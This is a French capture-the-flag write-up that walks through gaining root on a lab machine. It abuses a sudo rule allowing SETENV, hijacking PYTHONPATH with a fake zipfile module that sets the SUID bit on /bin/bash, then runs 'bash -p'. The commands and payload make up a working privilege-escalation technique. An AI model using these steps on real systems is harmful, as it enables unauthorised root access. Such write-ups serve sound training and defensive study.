# Year 5739 #2

## Contexte
- **Nom du challenge** : Year 5739 #2
- **Catégorie** : Privilege Escalation
- **Difficulté** : Easy
- **Objectif** : lire le fichier `/root/root.txt`, ce qui nécessite les droits **root**.
- **Point de départ** : reverse shell en tant qu'utilisateur `cave-of-miracles`
  (obtenu à la fin du challenge *Year 5739*).

---

## 1. Découverte du privilège sudo

Depuis le reverse shell obtenu en tant que `cave-of-miracles` :

```bash
sudo -l
```

```
User cave-of-miracles may run the following commands on <host>:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

Deux éléments intéressants :
- **`NOPASSWD`** : la commande s'exécute en root sans mot de passe.
- **`SETENV`** : autorise à **définir des variables d'environnement** (dont `PYTHONPATH`)
  malgré `sudo`.
---

## 2. Analyse du script cible

Le script `/opt/backup.py` **importe le module `zipfile`** :

```python
import zipfile
...
```

Or `zipfile` est un module **Python pur** (fichier `.py` non compilé), donc **remplaçable** :
si on peut faire charger à Python un autre fichier nommé `zipfile.py` avant la bibliothèque
standard, c'est notre code qui s'exécute au moment de l'`import`.

---

## 3. Exploitation — PYTHONPATH hijacking

`PYTHONPATH` ajoute des répertoires **prioritaires** dans la recherche des modules. Combiné
au `SETENV` autorisé par sudo, on peut donc forcer Python à charger un faux `zipfile`.

### 3.1 Création du faux module

```
import os
os.system("chmod +s /bin/bash")
```

Le payload rend `/bin/bash` **SUID** (le bit s'exécutera avec les droits de root car le
script est lancé en root).

### 3.2 Lancement via sudo

```bash
sudo PYTHONPATH=path_fake /usr/bin/python3 /opt/backup.py
```

Python charge `fake/zipfile.py` **avant** la lib standard → le payload s'exécute avec
les droits **root** dès l'`import`, avant même que le script ne plante plus loin.

---

## 4. Obtention du shell root

L'exploitation a rendu `/bin/bash` SUID root :

```bash
ls -l /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash
```

Le flag `-p` de bash conserve l'euid effectif (root) au lieu de l'abaisser :

```bash
/bin/bash -p
# euid=0 (root)
cat /root/root.txt
```

→ **shell root obtenu** et **flag `root.txt` obtenu**.

---

## Outils utilisés
- `sudo` — exécution du script en root
- `python3` — chargement du module détourné
- `bash` — shell SUID (`-p`)
- `chmod` — activation du bit SUID sur `/bin/bash`

## Techniques utilisées
- **Reconnaissance des privilèges** (`sudo -l`)
- Exploitation d'une **configuration sudo dangereuse** (`SETENV` + `NOPASSWD`)
- **PYTHONPATH hijacking** (détournement d'un module Python pur `zipfile`)
- **Privilege escalation via binaire SUID** (`/bin/bash -p`)
